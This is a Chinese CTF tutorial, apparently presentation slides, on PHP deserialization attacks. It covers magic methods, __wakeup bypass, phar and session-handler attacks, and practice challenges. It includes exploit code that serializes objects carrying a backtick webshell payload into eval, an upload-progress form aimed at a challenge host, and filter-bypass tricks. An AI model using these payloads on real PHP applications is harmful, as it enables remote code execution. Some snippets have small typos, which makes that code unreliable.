# PHP反序列化

序列化是一种将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程。序列化可以使数据在不同的平台或环境中进行交换或保存，以便在需要时恢复原始的数据结构或对象状态。

反序列化是一种将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。

PHP提供了两个内置函数来实现序列化和反序列化：

- [serialize()](https://www.php.net/manual/zh/function.serialize.php)，序列化函数，生成值的可存储表示。可处理所有的类型，除了 resource 类型和一些 object（大多数是没有序列化接口的内置对象）

- [unserialize()](https://www.php.net/manual/zh/function.unserialize.php)，反序列化函数，从已存储的表示中创建 PHP 的值

## 序列化字符串格式

### 基本类型的序列化字符串格式

```php
<?php
echo "整型 " . serialize(10) . PHP_EOL; // 整型 i:10;
echo "浮点型 " . serialize(13.14).PHP_EOL; // 浮点型 d:13.14;
echo "字符串 " . serialize("This is a string"). PHP_EOL; // 字符串 s:16:"This is a string";
echo "布尔型 " . serialize(FALSE). PHP_EOL; // 布尔型 b:0;
echo "NULL " . serialize(NULL). PHP_EOL; // NULL N;
echo "数组 " . serialize(['foo', 'bar', 'baz']). PHP_EOL; // 数组 a:3:{i:0;s:3:"foo";i:1;s:3:"bar";i:2;s:3:"baz";}

# 反序列化
$a = unserialize('s:16:"This is a string";');
var_dump($a); // string(16) "This is a string"
?>
```

例题：

```php
<?php
if(unserialize($_GET['name']) === 'admin') {
  echo "flag{}";
}
```

### 对象的序列化字符串格式

[对象序列化](https://www.php.net/manual/zh/language.oop5.serialization.php)

```php
O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%00isOK";b:0;}
O:类名长度:类名:属性个数:{s:属性名长度:属性名;s:属性值长度:属性值;...}
```

```php
<?php
class Person
{
   public $username = 'john';
   protected $age =  20;
   private $isOK = false;

   public function get_username()
   {
      return $this->usernme;
   }
}

$p = new Person();
var_dump(serialize($p));
```

- 序列化字符串只包含属性，不包含方法
- 属性的访问控制不一样，序列化后表现形式也不一样，属性有`public`、`protected`、`private`
  - `protected` - %00*%00
  - `private` - %00类名%00

## 常见魔术方法

魔术方法是一种特殊的方法，当对象执行某些操作时会覆盖PHP的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)

<div grid="~ cols-2 gap-4"><div>

```php
<?php
class Person {
    public $name, $age;

    function __construct($name, $age) {
        echo "__construct" . PHP_EOL;
        $this->name = $name;
        $this->age = $age;
    }

    public function get_name() {
        return  $this->name;
    }

    function __destruct() {
        echo "__destruct" . PHP_EOL;
    }

    public function __toString() {
        echo "__toString" . PHP_EOL;
        return "";
    }

    public function __wakeup() {
        echo "__wake_up" . PHP_EOL;
    }

    public function __sleep() {
        echo "__sleep" . PHP_EOL;
        return [];
    }

    public function __invoke() {
        echo "__invoke" . PHP_EOL;
    }

    public function __set($name, $value) {
        echo "__set" . PHP_EOL;
    }

    public function __get($name) {
        echo "__get" . PHP_EOL;
    }

    public function __call($name, $arguments) {
        echo "__call" . PHP_EOL;
    }
}

$o = new Person('Alice', 18);

// 对象被当成字符串时调用
echo $o;

// 以调用函数的方式调用一个对象时
$o();

// 访问不存在的属性
$o->not_found_property;
// 给不存在的属性赋值
$o->not_found_property = 'test';

// 调用一个不可访问方法时
$o->not_found_method();

// 序列化
$str = serialize($o);
// 反序列化
unserialize($str);

/* output
__construct
__toString
__invoke
__get
__set
__call
__sleep
__wake_up
__destruct
*/
```

|  魔术方法名称   |   说明  |
| --- | --- |
|__sleep()|serialize() 时调用|
|__wakeup()|unserialize() 时调用|
|__toString()|用于一个对象被当成字符串时调用|
|__invoke()|当尝试以调用函数的方式调用一个对象时|
|__construct()|构造函数，每次创建新对象时先调用此方法|
|__destruct()|析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行|
|__set()|在给不可访问（protected 或 private）或不存在的属性赋值时|
|__get()|读取不可访问（protected 或 private）或不存在的属性的值时|
|__call()|当对象调用一个不可访问方法时|


### 经典例题分析

- 源代码

```php
<?php
class test {
 public $cmd;

 function __destruct() {
  eval($this->cmd);
 }
}

unserialize($_GET['u']);
```

存在`test`类，其中析构函数`__destruct()`有代码执行

需要在本地调试代码，生成所需要的序列化字符串

- EXP：

```php
<?php
// 类名与题目类名保持一致
class test {
  // 只保留属性，可直接赋值
  public $cmd='?><?=`$_GET["cmd"]`';

  // 不保留方法
}
// 实例化对象
$o = new test;

// 也可通过访问对象属性赋值
// $o->cmd = '';

// 输出序列化字符串，必要时可进行URL编码
echo serialize($o);
// O:4:"test":1:{s:3:"cmd";s:19:"?><?=`$_GET["cmd"]`";}
```

## 常见绕过方法

- `__wakeup()`方法绕过（[CVE-2016-7124](https://www.cve.org/CVERecord?id=CVE-2016-7124)）

```text
When an unexpected object is created, __wakeup() is not invoked during deserialization, which could allow an attacker to bypass __wakeup() and invoke __destruct() with crafted properties.
PHP before 5.6.25 and 7.x before 7.0.10
```

当序列化字符串中表示对象属性个数的值**大于**真实属性个数时会跳过`__wakeup()`的执行

- `PHP > 7.1` 反序列化时对类属性的**访问控制**不敏感，只要属性名相同，就可以正常反序列化
- 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`s:3:"\61\62\63"`
- 使用`+`绕过`preg_match('/^O:\d+/')`正则检查，如`O:+4:"test"`


## POP链构造

面向属性编程（Property-Oriented Programing）

- 题眼

题目中有多个类，且每个类存在魔术方法


## PHP原生类

PHP内置类

读取目录、文件

- [DirectoryIterator](https://www.php.net/manual/zh/class.directoryiterator.php) - 列出当前目录下的文件信息
- [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
- [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径

- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo类为单个文件的信息提供了高级的面向对象接口


## Phar反序列化

`phar`扩展提供了一种将整个PHP应用程序放入单个叫做`phar`（PHP 归档）文件的方法，以便于分发和安装。phar 是 PHP 和 Archive 的合成词，大致上基于 Java 开发人员熟悉的 jar（Java 归档）。

phar文件由[4部分组成](https://www.php.net/manual/zh/phar.fileformat.phar.php)：

1. `stub`，标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`结尾
2. `manifest`，清单。其中还会经`serialize()`序列化保存`Meta-data`
3. `contents`，内容
4. `signature`，签名，可选

`phar://`协议

```php
<?php
include 'phar:///path/to/myphar.phar/file.php';
?>
```

漏洞原理

2018年，安全研究员`Sam Thomas`分享了议题[It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)，利用phar文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了php反序列化漏洞的攻击面。

参考：<https://paper.seebug.org/680/>

题眼

- 允许上传精心构造的phar文件
- 允许使用`phar://`

添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件

创建phar文件

注意：`php.ini`中的`phar.readonly`选项设置为`Off`，否则无法生成phar文件。

```php
<?php
class AnyClass {}

@unlink("test.phar"); // 删除已有文件
$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$object = new AnyClass();
$phar->setMetadata($object); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

例题：D3CTF 2019 EzUpload   [GXYCTF2019]BabysqliV3.0

<style>
  .slidev-code {
    height: 400px !important;
  }
</style>

```php
<?php
class dir {
 public $userdir;
 public $url;
 public $filename;

  // 构造函数，为每个用户创建独立的目录
 public function __construct($url, $filename) {
  $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
  $this->url = $url;
  $this->filename = $filename;
  if (!file_exists($this->userdir)) {
   mkdir($this->userdir, 0777, true);
  }
 }

  // 检查目录
 public function checkdir() {
  if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
   die('hacker!!!');
  }
 }

  // 检查url，协议不能为空，也不能是file、php
 public function checkurl() {
  $r = parse_url($this->url);
  if (!isset($r['scheme']) || preg_match("/file|php/i", $r['scheme'])) {
   die('hacker!!!');
  }
 }

  // 检查文件名，不能包含..、/，后缀不能有ph
 public function checkext() {
  if (stristr($this->filename, '..')) {
   die('hacker!!!');
  }
  if (stristr($this->filename, '/')) {
   die('hacker!!!');
  }
  $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
  if (preg_match("/ph/i", $ext)) {
   die('hacker!!!');
  }
 }
 public function upload() {
  $this->checkdir();
  $this->checkurl();
  $this->checkext();
  $content = file_get_contents($this->url, NULL, NULL, 0, 2048);
  if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)) {
   die('hacker!!!');
  }
  file_put_contents($this->userdir."/".$this->filename, $content);
 }
 public function remove() {
  $this->checkdir();
  $this->checkext();
  if (file_exists($this->userdir."/".$this->filename)) {
   unlink($this->userdir."/".$this->filename);
  }
 }
 public function count($dir) {
  if ($dir === '') {
   $num = count(scandir($this->userdir)) - 2;
  } else {
   $num = count(scandir($dir)) - 2;
  }
  if ($num > 0) {
   return "you have $num files";
  } else {
   return "you don't have file";
  }
 }
 public function __toString() {
  return implode(" ", scandir(__DIR__."/".$this->userdir));
 }
 public function __destruct() {
  $string = "your file in : ".$this->userdir;
  file_put_contents($this->filename.".txt", $string);
  echo $string;
 }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])) {
 highlight_file(__FILE__);
 die();
}

$dir = new dir($_POST['url'], $_POST['filename']);
if ($_POST['action'] === "upload") {
 $dir->upload();
} elseif ($_POST['action'] === "remove") {
 $dir->remove();
} elseif ($_POST['action'] === "count") {
 if (!isset($_POST['dir'])) {
  echo $dir->count('');
 } else {
  echo $dir->count($_POST['dir']);
 }
}
```

## PHP session 反序列化

`session`是一种“会话机制”，其数据存储于服务端，PHP提供`$_SEESION`超全局变量

会话开始后，PHP将会话中的数据保存到 `$_SESSION` 数组。

当PHP运行结束后，将`$_SESSION`中的内容进行序列化后，通过会话保存管理器将序列化后的字符串保存到`session`文件中。

```php
<?php
// 开启session会话
session_start();

$_SESSION['username'] = 'Alice';
```

|[常见配置选项](https://www.php.net/manual/en/session.configuration.php)|说明|
|---|---|
|session.save_handler|保存形式，默认为files|
|session.save_path|保存路径，默认路径有`/tmp/`、`/var/lib/php/`|
|session.serialize_handler|序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php`|


不同序列化处理器，序列化数据存储格式不同


```php
<?php
// 设置脚本执行期间的session处理器，php、php_binary、php_serialize
ini_set('session.serialize_handler', 'php_binary');

// 开启session会话
session_start();

$_SESSION['name'] = 'Alice';
$_SESSION['age'] = 25;
```

|处理器名称|数据存储格式|
|---|---|
|php|键名 + 竖线 + 经过 serialize() 函数序列化处理的值，如 name\|s:5:"Alice";age\|i:25;|
|php_binary|键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值，如 \x04names:5:"Alice";\x03agei:25;|
|php_serialize|$_SESSION数组经serialize()函数处理，如 a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}|

### 例题分析

`2020-HFCTF-BabyUpload`
如果对`session`在序列化和反序列化时使用的处理器不同，会造成读写出现不一致，经特殊构造，会产生反序列化漏洞。混合使用`php`处理器和`php_serialize`处理器，，

假如提交的数据为`name=|O:4:"test":0:{}`

- 若存储用 `php_serialize` 处理器，则 `a:1:{s:4:"name";s:16:"|O:4:"test":0:{}";}`

- 若读取用 `php` 处理器，则会将`|`前面的内容当作键名，其后内容`O:4:"test":0:{}`进行反序列化，继而触发反序列化漏洞

题眼

- 可以控制`session`的内容
- 脚本文件指定了处理器


例题：Jarvis OJ — PHPINFO  分析

<style>
  .slidev-code {
    height: 400px !important;
  }
</style>

<div grid="~ cols-2 gap-4"><div>

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

<http://web.jarvisoj.com:32784/>

1. 存在恶意类`OowoO`，析构方法中存在代码执行漏洞
2. 通过 `phpinfo()` 可知：

- *`session.upload_progress.enabled=On`*，可用文件上传在`session`中写入数据
- *`session.serialize_handler`* 的默认值为`php_serialize`，脚本运行时配置为`php`，**处理器不一致**

3. 我们可通过文件上传控制`session`文件内容，进而实现`session`反序列化漏洞攻击


<!--
https://xz.aliyun.com/t/6640

相关题目
2020 高校战役赛 Hackme
https://miaotony.xyz/2020/11/05/CTF_2020_0xGame/#toc-heading-4
LCTF2018 bestphp’s revenge

漏洞:
Joomla 1.5-3.4 P168
-->

例题：Jarvis OJ — PHPINFO 解题步骤

1. 生成`payload`

```php
<?php
class OowoO{
    public $mdzz = '?><?=`$GET["cmd"]`';
}
$obj  = new OowoO();
echo serialize($obj);
// O:5:"OowoO":1:{s:4:"mdzz";s:18:"?><?=`$GET["cmd"]`";}
?>
```

2. 构造文件上传进度请求
  
```html
<form action="http://web.jarvisoj.com:32784/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

## 字符逃逸



## 练习题

- 基础
  - 极客大挑战 2019 php
  - 2020-网鼎杯朱雀组-phpweb
- POP
  - ISCC_2022_POP2022
  - 强网杯_2021_赌徒
  - 网鼎杯_2020_青龙组AreUSerialz
  - ISCC_2022_findme
  - GYCTF2020 Easyphp
- 字符逃逸
  - 强网杯_2020_Web辅助


### 极客大挑战 2019 php

1. 目录扫描，`www.zip`
2. 绕过`__wakeup()`

```php
class Name {
	private $username = 'admin';
	private $password = 100;
}

$o = new Name;
// 由于属性为私有，采用URL编码
echo urlencode(serialize($o));
```

```php
O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

### 2020-网鼎杯朱雀组-phpweb
### ISCC_2022_POP2022
